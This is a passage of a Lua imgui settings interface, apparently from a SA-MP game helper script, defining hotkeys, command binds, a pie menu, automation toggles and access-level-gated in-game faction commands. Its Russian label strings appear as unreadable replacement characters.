					if imgui.ToggleButton("tab_skipd5", togglebools.tab_skipd[5]) then config_ini.bools[49] = togglebools.tab_skipd[5].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("����������� �� ������������ ������ ������������� (�� ������ ")) imgui.SameLine() imgui.PushItemWidth(90) imgui.InputText(u8'##dial1', guibuffers.dial.med) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8(" ����.)"))
					if imgui.ToggleButton("tab_skipd6", togglebools.tab_skipd[6]) then config_ini.bools[50] = togglebools.tab_skipd[6].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("������������� ����������� ������ �������� ���. ���������� � ����� (�� ������ ")) imgui.SameLine() imgui.PushItemWidth(90) imgui.InputText(u8'##dial2', guibuffers.dial.rem) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8(" ����.)"))
					if imgui.ToggleButton("tab_skipd7", togglebools.tab_skipd[7]) then config_ini.bools[51] = togglebools.tab_skipd[7].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("������������� ��������� ����������� ��������� (�� ������ ")) imgui.SameLine() imgui.PushItemWidth(90) imgui.InputText(u8'##dial3', guibuffers.dial.meh) imgui.SameLine() imgui.PopItemWidth() imgui.Text(u8(" ����.)"))				
					if imgui.ToggleButton("tab_skipd8", togglebools.tab_skipd[8]) then config_ini.bools[53] = togglebools.tab_skipd[8].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("������������� �������� �������� � ������������ �� ��� (�� ������ ")) imgui.SameLine() imgui.PushItemWidth(90) imgui.InputText(u8'##dial4', guibuffers.dial.azs) imgui.SameLine() imgui.PopItemWidth() imgui.Text(u8(" ����.)"))				
				end

				if maintabs.tab_main_binds.status then
						if maintabs.tab_main_binds.first then
								imgui.NewLine()
								imgui.Hotkey("Name", 1, 100) imgui.SameLine() imgui.Text(u8("�������� � ����� � �����"))
								imgui.SameLine(600)
								imgui.Hotkey("Name19", 19, 100) imgui.SameLine() imgui.Text(u8("����� ������ � members")) imgui.NewLine()

								imgui.Hotkey("Name2", 2, 100) imgui.SameLine() imgui.Text(u8("�������� ���� ���������"))
								imgui.SameLine(600)
								imgui.Hotkey("Name20", 20, 100) imgui.SameLine() imgui.Text(u8("������� ����� �������")) imgui.NewLine()

								imgui.Hotkey("Name3", 3, 100) imgui.SameLine() imgui.Text(u8("���� ��������"))
								imgui.SameLine(600)
								imgui.Hotkey("Name21", 21, 100) imgui.SameLine() imgui.Text(u8("�������� ���� ������� � �����\n/r || �.�.�.�. || SOS �-14")) imgui.NewLine()

								imgui.Hotkey("Name4", 4, 100) imgui.SameLine() imgui.Text(u8("����������� �������\n(����������� ����� �������� ������ - ������ ��������� �������)"))
								imgui.SameLine(600)
								imgui.Hotkey("Name22", 22, 100) imgui.SameLine() imgui.Text(u8("������� ������/��������� ������")) imgui.NewLine()

								imgui.Hotkey("Name5", 5, 100) imgui.SameLine() imgui.Text(u8("���������������� � ��������� �������"))
								imgui.SameLine(600)
								imgui.Hotkey("Name24", 23, 100) imgui.SameLine() imgui.Text(u8("���� ��������")) imgui.NewLine()

								imgui.Hotkey("Name6", 6, 100) imgui.SameLine() imgui.Text(u8("�������� (���������� ���������� �� ���������)"))
								imgui.SameLine(600)
								imgui.Hotkey("Name27", 25, 100) imgui.SameLine() imgui.Text(u8("�������� ������ �� �� ���")) imgui.SameLine() if imgui.ToggleButton("CHs1", togglebools.tab_main_binds.clistparams[1]) then config_ini.bools[2] = togglebools.tab_main_binds.clistparams[1].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("���������� ��������")) imgui.NewLine()

								imgui.Hotkey("Name7", 7, 100) imgui.SameLine() imgui.Text(u8("�������� (���������� ������������)"))
								imgui.SameLine(600)
								imgui.Hotkey("Name28", 26, 100) imgui.SameLine() imgui.Text(u8("������� �����")) imgui.SameLine() if imgui.ToggleButton("Zdrj", togglebools.tab_main_binds.clistparams[2]) then config_ini.bools[3] = togglebools.tab_main_binds.clistparams[2].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("��������� �������� �����������")) imgui.NewLine()

								imgui.Hotkey("Name8", 8, 100) imgui.SameLine() imgui.Text(u8("�������� (���������� �������� ����������)"))
								imgui.SameLine(600)
								imgui.Hotkey("Name13", 13, 100) imgui.SameLine() imgui.Text(u8("/lock")) imgui.NewLine()

								imgui.Hotkey("Name9", 9, 100) imgui.SameLine() imgui.Text(u8("�������� \"�������� \"�.�.�.�.\"\"")) imgui.NewLine()

								imgui.Hotkey("Name23", 10, 100) imgui.SameLine() imgui.Text(u8("������� �����")) imgui.NewLine()
								imgui.Hotkey("Name25", 11, 100) imgui.SameLine() imgui.Text(u8("������� (������)")) imgui.NewLine()
								imgui.Hotkey("Name12", 12, 100) imgui.SameLine() imgui.Text(u8("�������� �������������")) imgui.NewLine()
						end

						if maintabs.tab_main_binds.clistparams then
								imgui.PushItemWidth(500)
								imgui.InputText(u8'##clist1', guibuffers.clistparams.clist1) imgui.PopItemWidth() imgui.SameLine(600) imgui.PushItemWidth(500) imgui.InputText(u8'##clist27', guibuffers.clistparams.clist27)
								imgui.InputText(u8'##clist2', guibuffers.clistparams.clist2) imgui.PopItemWidth() imgui.SameLine(600) imgui.PushItemWidth(500) imgui.InputText(u8'##clist28', guibuffers.clistparams.clist28)
								imgui.InputText(u8'##clist3', guibuffers.clistparams.clist3) imgui.PopItemWidth() imgui.SameLine(600) imgui.PushItemWidth(500) imgui.InputText(u8'##clist29', guibuffers.clistparams.clist29)
								imgui.InputText(u8'##clist4', guibuffers.clistparams.clist4) imgui.PopItemWidth() imgui.SameLine(600) imgui.PushItemWidth(500) imgui.InputText(u8'##clist30', guibuffers.clistparams.clist30)
								imgui.InputText(u8'##clist5', guibuffers.clistparams.clist5) imgui.PopItemWidth() imgui.SameLine(600) imgui.PushItemWidth(500) imgui.InputText(u8'##clist31', guibuffers.clistparams.clist31)
								imgui.InputText(u8'##clist6', guibuffers.clistparams.clist6) imgui.PopItemWidth() imgui.SameLine(600) imgui.PushItemWidth(500) imgui.InputText(u8'##clist32', guibuffers.clistparams.clist32)
								imgui.InputText(u8'##clist7', guibuffers.clistparams.clist7) imgui.PopItemWidth() imgui.SameLine(600) imgui.PushItemWidth(500) imgui.InputText(u8'##clist33', guibuffers.clistparams.clist33)
								imgui.InputText(u8'##clist8', guibuffers.clistparams.clist8)
								imgui.InputText(u8'##clist9', guibuffers.clistparams.clist9)
								imgui.InputText(u8'##clist10', guibuffers.clistparams.clist10)
								imgui.InputText(u8'##clist11', guibuffers.clistparams.clist11)
								imgui.InputText(u8'##clist13', guibuffers.clistparams.clist13)
								imgui.InputText(u8'##clist14', guibuffers.clistparams.clist14)
								imgui.InputText(u8'##clist15', guibuffers.clistparams.clist15)
								imgui.InputText(u8'##clist16', guibuffers.clistparams.clist16)
								imgui.InputText(u8'##clist17', guibuffers.clistparams.clist17)
								imgui.InputText(u8'##clist18', guibuffers.clistparams.clist18)
								imgui.InputText(u8'##clist19', guibuffers.clistparams.clist19)
								imgui.InputText(u8'##clist20', guibuffers.clistparams.clist20)
								imgui.InputText(u8'##clist21', guibuffers.clistparams.clist21)
								imgui.InputText(u8'##clist22', guibuffers.clistparams.clist22)
								imgui.InputText(u8'##clist23', guibuffers.clistparams.clist23)
								imgui.InputText(u8'##clist24', guibuffers.clistparams.clist24)
								imgui.InputText(u8'##clist25', guibuffers.clistparams.clist25)
								imgui.InputText(u8'##clist26', guibuffers.clistparams.clist26)
								imgui.PopItemWidth()
						end
						
						
						
						imgui.SetCursorPos(imgui.ImVec2(ww/2 + 470, wh/2 - 30))
							if imgui.Button(u8("1"), imgui.ImVec2(120.0, 20.0)) then maintabs.tab_main_binds.first, maintabs.tab_main_binds.clistparams = true, false end
						imgui.SetCursorPos(imgui.ImVec2(ww/2 + 470, wh/2))
							if imgui.Button(u8("��������� �����"), imgui.ImVec2(120.0, 20.0)) then maintabs.tab_main_binds.first, maintabs.tab_main_binds.clistparams = false, true end
				end

				if maintabs.tab_user_binds.status then
						if maintabs.tab_user_binds.hk then
								imgui.NewLine()
								imgui.Text(u8("������� ���������")) imgui.SameLine(300)  imgui.Text(u8("��������")) imgui.NewLine()
								imgui.Hotkey("Name27", 27, 100) imgui.SameLine() imgui.InputText(u8'##bind1', guibuffers.ubinds.bind1) imgui.SameLine() if imgui.ToggleButton("enter1", togglebools.tab_user_binds.hk[1]) then config_ini.bools[4] = togglebools.tab_user_binds.hk[1].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("Enter")) imgui.NewLine()
								imgui.Hotkey("Name28", 28, 100) imgui.SameLine() imgui.InputText(u8'##bind2', guibuffers.ubinds.bind2) imgui.SameLine() if imgui.ToggleButton("enter2", togglebools.tab_user_binds.hk[2]) then config_ini.bools[5] = togglebools.tab_user_binds.hk[2].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("Enter")) imgui.NewLine()
								imgui.Hotkey("Name29", 29, 100) imgui.SameLine() imgui.InputText(u8'##bind3', guibuffers.ubinds.bind3) imgui.SameLine() if imgui.ToggleButton("enter3", togglebools.tab_user_binds.hk[3]) then config_ini.bools[6] = togglebools.tab_user_binds.hk[3].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("Enter")) imgui.NewLine()
								imgui.Hotkey("Name30", 30, 100) imgui.SameLine() imgui.InputText(u8'##bind4', guibuffers.ubinds.bind4) imgui.SameLine() if imgui.ToggleButton("enter4", togglebools.tab_user_binds.hk[4]) then config_ini.bools[7] = togglebools.tab_user_binds.hk[4].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("Enter")) imgui.NewLine()
								imgui.Hotkey("Name31", 31, 100) imgui.SameLine() imgui.InputText(u8'##bind5', guibuffers.ubinds.bind5) imgui.SameLine() if imgui.ToggleButton("enter5", togglebools.tab_user_binds.hk[5]) then config_ini.bools[8] = togglebools.tab_user_binds.hk[5].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("Enter")) imgui.NewLine()
								imgui.Hotkey("Name32", 32, 100) imgui.SameLine() imgui.InputText(u8'##bind6', guibuffers.ubinds.bind6) imgui.SameLine() if imgui.ToggleButton("enter6", togglebools.tab_user_binds.hk[6]) then config_ini.bools[9] = togglebools.tab_user_binds.hk[6].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("Enter")) imgui.NewLine()
								imgui.Hotkey("Name33", 33, 100) imgui.SameLine() imgui.InputText(u8'##bind7', guibuffers.ubinds.bind7) imgui.SameLine() if imgui.ToggleButton("enter7", togglebools.tab_user_binds.hk[7]) then config_ini.bools[10] = togglebools.tab_user_binds.hk[7].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("Enter")) imgui.NewLine()
								imgui.Hotkey("Name34", 34, 100) imgui.SameLine() imgui.InputText(u8'##bind8', guibuffers.ubinds.bind8) imgui.SameLine() if imgui.ToggleButton("enter8", togglebools.tab_user_binds.hk[8]) then config_ini.bools[11] = togglebools.tab_user_binds.hk[8].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("Enter")) imgui.NewLine()
								imgui.Hotkey("Name35", 35, 100) imgui.SameLine() imgui.InputText(u8'##bind9', guibuffers.ubinds.bind9) imgui.SameLine() if imgui.ToggleButton("enter9", togglebools.tab_user_binds.hk[9]) then config_ini.bools[12] = togglebools.tab_user_binds.hk[9].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("Enter")) imgui.NewLine()
								imgui.Hotkey("Name36", 36, 100) imgui.SameLine() imgui.InputText(u8'##bind10', guibuffers.ubinds.bind10) imgui.SameLine() if imgui.ToggleButton("enter10", togglebools.tab_user_binds.hk[10]) then config_ini.bools[13] = togglebools.tab_user_binds.hk[10].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("Enter")) imgui.NewLine()
								imgui.Hotkey("Name37", 37, 100) imgui.SameLine() imgui.InputText(u8'##bind11', guibuffers.ubinds.bind11) imgui.SameLine() if imgui.ToggleButton("enter11", togglebools.tab_user_binds.hk[11]) then config_ini.bools[14] = togglebools.tab_user_binds.hk[11].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("Enter"))
						end

						if maintabs.tab_user_binds.cmd then
								imgui.NewLine()
								imgui.Text(u8("������� ���������")) imgui.SameLine(300)  imgui.Text(u8("��������")) imgui.NewLine()
								imgui.PushItemWidth(100)
								imgui.InputText(u8'##ucbindsc1', guibuffers.ucbindsc.bind1) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##ucbinds1', guibuffers.ucbinds.bind1) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##ucbindsc2', guibuffers.ucbindsc.bind2) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##ucbinds2', guibuffers.ucbinds.bind2) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##ucbindsc3', guibuffers.ucbindsc.bind3) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##ucbinds3', guibuffers.ucbinds.bind3) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##ucbindsc4', guibuffers.ucbindsc.bind4) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##ucbinds4', guibuffers.ucbinds.bind4) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##ucbindsc5', guibuffers.ucbindsc.bind5) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##ucbinds5', guibuffers.ucbinds.bind5) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##ucbindsc6', guibuffers.ucbindsc.bind6) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##ucbinds6', guibuffers.ucbinds.bind6) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##ucbindsc7', guibuffers.ucbindsc.bind7) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##ucbinds7', guibuffers.ucbinds.bind7) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##ucbindsc8', guibuffers.ucbindsc.bind8) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##ucbinds8', guibuffers.ucbinds.bind8) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##ucbindsc9', guibuffers.ucbindsc.bind9) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##ucbinds9', guibuffers.ucbinds.bind9) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##ucbindsc10', guibuffers.ucbindsc.bind10) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##ucbinds10', guibuffers.ucbinds.bind10) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##ucbindsc11', guibuffers.ucbindsc.bind11) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##ucbinds11', guibuffers.ucbinds.bind11) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##ucbindsc12', guibuffers.ucbindsc.bind12) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##ucbinds12', guibuffers.ucbinds.bind12) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##ucbindsc13', guibuffers.ucbindsc.bind13) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##ucbinds13', guibuffers.ucbinds.bind13) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##ucbindsc14', guibuffers.ucbindsc.bind14) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##ucbinds14', guibuffers.ucbinds.bind14) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.PopItemWidth()
						end

						if maintabs.tab_user_binds.pie then
								imgui.NewLine()
								imgui.Text(u8("Pie menu - ��� �������� ���������� ���� ��� �������� ������� ���������. �� ������ ��������� �� ������ ��������. ����������� ������� ���������, �������� �� ������ ����� � ��������� �������."))
								imgui.Hotkey("Name44", 44, 100) imgui.SameLine() imgui.Text(u8("������� ��������� (������ ��������� ������� ��������������)")) imgui.NewLine()
								imgui.Text(u8("��� ������")) imgui.SameLine(200)  imgui.Text(u8("��������")) imgui.NewLine()
								imgui.PushItemWidth(100)
								imgui.InputText(u8'##piename1', guibuffers.UserPieMenu.names.name1) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##pieaction1', guibuffers.UserPieMenu.actions.action1) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##piename2', guibuffers.UserPieMenu.names.name2) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##pieaction2', guibuffers.UserPieMenu.actions.action2) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##piename3', guibuffers.UserPieMenu.names.name3) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##pieaction3', guibuffers.UserPieMenu.actions.action3) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##piename4', guibuffers.UserPieMenu.names.name4) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##pieaction4', guibuffers.UserPieMenu.actions.action4) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##piename5', guibuffers.UserPieMenu.names.name5) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##pieaction5', guibuffers.UserPieMenu.actions.action5) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##piename6', guibuffers.UserPieMenu.names.name6) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##pieaction6', guibuffers.UserPieMenu.actions.action6) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##piename7', guibuffers.UserPieMenu.names.name7) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##pieaction7', guibuffers.UserPieMenu.actions.action7) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##piename8', guibuffers.UserPieMenu.names.name8) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##pieaction8', guibuffers.UserPieMenu.actions.action8) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##piename9', guibuffers.UserPieMenu.names.name9) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##pieaction9', guibuffers.UserPieMenu.actions.action9) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##piename10', guibuffers.UserPieMenu.names.name10) imgui.SameLine() imgui.PushItemWidth(900) imgui.InputText(u8'##pieaction10', guibuffers.UserPieMenu.actions.action10) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.PopItemWidth()
						end

						imgui.SetCursorPos(imgui.ImVec2(ww/2 + 470, wh/2 - 30))
								if imgui.Button(u8("�� �������"), imgui.ImVec2(120.0, 20.0)) then maintabs.tab_user_binds.hk, maintabs.tab_user_binds.cmd, maintabs.user_keys.status.v, maintabs.tab_user_binds.pie = true, false, false, false end
						imgui.SetCursorPos(imgui.ImVec2(ww/2 + 470, wh/2))
								if imgui.Button(u8("�� �������"), imgui.ImVec2(120.0, 20.0)) then maintabs.tab_user_binds.hk, maintabs.tab_user_binds.cmd,maintabs.user_keys.status.v, maintabs.tab_user_binds.pie = false, true, false, false end
						imgui.SetCursorPos(imgui.ImVec2(ww/2 + 470, wh/2 + 30))
								if imgui.Button(u8("Pie menu"), imgui.ImVec2(120.0, 20.0)) then maintabs.tab_user_binds.hk, maintabs.tab_user_binds.cmd,maintabs.user_keys.status.v, maintabs.tab_user_binds.pie = false, false, false, true end
						imgui.SetCursorPos(imgui.ImVec2(ww/2 + 470, wh/2 + 60))
								if imgui.Button(u8("������ ������"), imgui.ImVec2(120.0, 20.0)) then maintabs.user_keys.status.v = true end
				end

				if maintabs.tab_bbot.status then
						imgui.NewLine()
						if imgui.Button(u8("������� ����� ��������� �������� ��������� ��������� � ���"), imgui.ImVec2(400.0, 20.0)) then maintabs.rphr.status.v = true end
						if imgui.Button(u8("������� ����� ��������� �������������� ������ �� �� ������"), imgui.ImVec2(400.0, 20.0)) then maintabs.auto_bp.status.v = true end
						if imgui.Button(u8("������� ����� ��������� ������� �� ���������� ���� � �����"), imgui.ImVec2(400.0, 20.0)) then maintabs.warnings.status.v = true end
						if imgui.ToggleButton("tab_bbot1", togglebools.tab_bbot[1]) then config_ini.bools[39] = togglebools.tab_bbot[1].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ��������� ���� � ����"))
						--if imgui.ToggleButton("tab_bbot2", togglebools.tab_bbot[3]) then config_ini.bools[42] = togglebools.tab_bbot[3].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("������������� ���������������� ���� ���� � ������ ���� ��������"))
						if imgui.ToggleButton("tab_bbot3", togglebools.tab_bbot[4]) then config_ini.bools[55] = togglebools.tab_bbot[4].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("��������� � �������� �� ���� ������� � ����������"))
						--if imgui.ToggleButton("tab_bbot4", togglebools.tab_bbot[5]) then config_ini.bools[56] = togglebools.tab_bbot[5].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("��������� ������� ��������� �� ��������� ����� �������������"))
						if imgui.ToggleButton("tab_bbot5", togglebools.tab_bbot[6]) then config_ini.bools[15] = togglebools.tab_bbot[6].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("��������� � ������������� �������� � ���������� �������"))
						if imgui.ToggleButton("tab_bbot6", togglebools.tab_bbot[7]) then config_ini.bools[57] = togglebools.tab_bbot[7].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("������������� ������� ������ � �������������� ����� ��������� (������� ��� ���������)")) if imgui.IsItemClicked() then maintabs.tab_main_binds.gunparams.v = true end
						if imgui.ToggleButton("tab_bbot7", togglebools.tab_bbot[8]) then config_ini.bools[59] = togglebools.tab_bbot[8].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("������������� ��������� �������� ���� ������� � ������ �����������"))
						imgui.Hotkey("Name41", 41, 100) imgui.SameLine() imgui.Text(u8("�������������� ������� ������� ��������")) imgui.NewLine()
						if imgui.ToggleButton("tab_bbot8", togglebools.tab_bbot[9]) then config_ini.bools[60] = togglebools.tab_bbot[9].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("������������ ������� ����� ������ (������� ��� ���������)")) if imgui.IsItemClicked() then maintabs.tab_weap.status.v = true end

				end

				if maintabs.tab_commands.status then
						if maintabs.tab_commands.first then
								imgui.NewLine()
								imgui.PushItemWidth(100)
								imgui.InputText(u8'##commands1', guibuffers.commands.command1) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("�������� � ���������� ��������"))
								imgui.SameLine(600) imgui.PushItemWidth(100)
								imgui.InputText(u8'##commands19', guibuffers.commands.command19) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("�������� ��� ���������� �����������")) imgui.PushItemWidth(100) imgui.NewLine()

								imgui.InputText(u8'##commands2', guibuffers.commands.command2) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("�������� � ������������� ���������"))
								imgui.SameLine(600) imgui.PushItemWidth(100)
								imgui.InputText(u8'##commands20', guibuffers.commands.command20) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("������� ������ ���� ������ ������� ������ � ���������� ����")) imgui.PushItemWidth(100) imgui.NewLine()

								imgui.InputText(u8'##commands3', guibuffers.commands.command3) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("�������� � ��������� ���������"))
								imgui.SameLine(600) imgui.PushItemWidth(100)
								imgui.InputText(u8'##commands21', guibuffers.commands.command21) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("���������� ��������� ������")) imgui.PushItemWidth(100) imgui.NewLine()

								imgui.InputText(u8'##commands4', guibuffers.commands.command4) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("�������� � ������� �������������� ���������"))
								imgui.SameLine(600) imgui.PushItemWidth(100)
								imgui.InputText(u8'##commands22', guibuffers.commands.command22) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("���������� ��������� �����")) imgui.PushItemWidth(100) imgui.NewLine()

								imgui.InputText(u8'##commands5', guibuffers.commands.command5) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("�������� � ����������� ��������� �� ����"))
								imgui.SameLine(600) imgui.PushItemWidth(100)
								imgui.InputText(u8'##commands25', guibuffers.commands.command25) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("����������� ����� AFK")) imgui.PushItemWidth(100) imgui.NewLine()

								imgui.InputText(u8'##commands6', guibuffers.commands.command6) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("�������� � �������� ��������"))
								imgui.SameLine(600) imgui.PushItemWidth(100)
								imgui.InputText(u8'##commands27', guibuffers.commands.command27) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("������� ���� ��������� � ���� � ���� �������")) imgui.PushItemWidth(100) imgui.NewLine()

								imgui.InputText(u8'##commands7', guibuffers.commands.command7) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("�������� � ��������� �����(��)"))
								imgui.SameLine(600) imgui.PushItemWidth(100)
								imgui.InputText(u8'##commands28', guibuffers.commands.command28) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("�������� ������� � �������������")) imgui.PushItemWidth(100) imgui.NewLine()

								imgui.InputText(u8'##commands9', guibuffers.commands.command9) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("�������� � ����� � �����"))
								imgui.SameLine(600) imgui.PushItemWidth(100)
								imgui.InputText(u8'##commands17', guibuffers.commands.command17) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("����� ������ � �� ���")) imgui.PushItemWidth(100) imgui.NewLine()

								imgui.InputText(u8'##commands10', guibuffers.commands.command10) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("������� ����� � �������/�����"))
								imgui.SameLine(600) imgui.PushItemWidth(100)
								imgui.InputText(u8'##commands18', guibuffers.commands.command18) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("������� ���� ��������")) imgui.PushItemWidth(100) imgui.NewLine()

								imgui.InputText(u8'##commands11', guibuffers.commands.command11) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("������������� � ��������� �������")) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##commands12', guibuffers.commands.command12) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("������� �������")) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##commands13', guibuffers.commands.command13) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("�������� ����������")) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##commands14', guibuffers.commands.command14) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("������� ��������� �����")) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##commands15', guibuffers.commands.command15) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("��������� ������ ��")) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.InputText(u8'##commands16', guibuffers.commands.command16) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("����� ������ � members")) imgui.PushItemWidth(100) imgui.NewLine()
								imgui.PopItemWidth()
						end

						if maintabs.tab_commands.second and access.alevel >= 0 then
								imgui.NewLine()
								imgui.Text(u8("� ������ ������� ������������ ������� ���������� ������� (��� ��� � ������� ������). ��� ����������� ������ ������ ��������� ����������� � ������� � ������� ������� /balogin"))
								if access.alevel > 0 then
										imgui.Text(u8("/lek [pmp/rb/np/tp/nv/no] - ����������� ������� � ����������� ��������� ������"))
										imgui.Text(u8("/pcheck (-1) - ������� ������ ������������� ������� ������ (-1 - ���� ������)"))
										imgui.Text(u8("/tren [�������] [���������� ���������] [���������� �����������] [��������� (1-3)] [������������� �����������] - ���������� ������� � ���������� ���������� � �������"))
								end

								if access.alevel > 1 then
										imgui.Text(u8("/padd [id/nick] - �������� ���������� ������ � ������ �������������"))
										imgui.Text(u8("/pdel [id/nick] - ������� ���������� ������ �� ������ �������������"))
										imgui.Text(u8("/add [id] [���� ���������� ���������] - �������� ������ � ������� ������"))
										imgui.Text(u8("/del [id] ([������� �������� � ��]) - ������� ������ �� ������� ������"))
										imgui.Text(u8("/change [id] [rank: 1/0] [�������/0/-1] ([��������� � ������: 1/0]) - �������� ���������� �� ������ � ������� ������"))
										imgui.Text(u8("/mark [id] [zua/zuo/zio/zz/pmp/rb/uts/no/kp/np/op/total/dopusk] [������ 0-5] ([������� ���������]) - ���������� ������ ������ �� ������������ ���������"))										
								end

								if access.alevel > 2 then
									imgui.Text(u8("/otm - ���������� ������� ������� ������� � ������� (����� +)"))							
								end
								
								if access.alevel == 3 or access.alevel == 6 then
									imgui.Text(u8("/fond [add/del/ref] - �������� ���� ������ (������� ��� ���������)")) if imgui.IsItemClicked() then maintabs.tab_commands.money.v = true end
								end

								if access.alevel > 4 then
									imgui.Text(u8("/moder [id] [�������] [������ ��� �����] - ������ ���������� ������ ����� ����������"))
									imgui.Text(u8("/reg [id] [T/M/H] - ���������������� ������ � ������� (���� �������)"))
									imgui.Text(u8("/ban [id] - ������� ������ � ������� ���������� ������ (���� �������)"))
								end
						end

						imgui.SetCursorPos(imgui.ImVec2(ww/2 + 470, wh/2 - 30))
								if imgui.Button(u8("1"), imgui.ImVec2(120.0, 20.0)) then maintabs.tab_commands.first, maintabs.tab_commands.second, maintabs.tab_commands.help.v, maintabs.tab_commands.money.v = true, false, false, false end
						if access.alevel >= 0 then
								imgui.SetCursorPos(imgui.ImVec2(ww/2 + 470, wh/2))
										if imgui.Button(u8("2"), imgui.ImVec2(120.0, 20.0)) then maintabs.tab_commands.first, maintabs.tab_commands.second, maintabs.tab_commands.help.v, maintabs.tab_commands.money.v = false, true, false, false end
						end
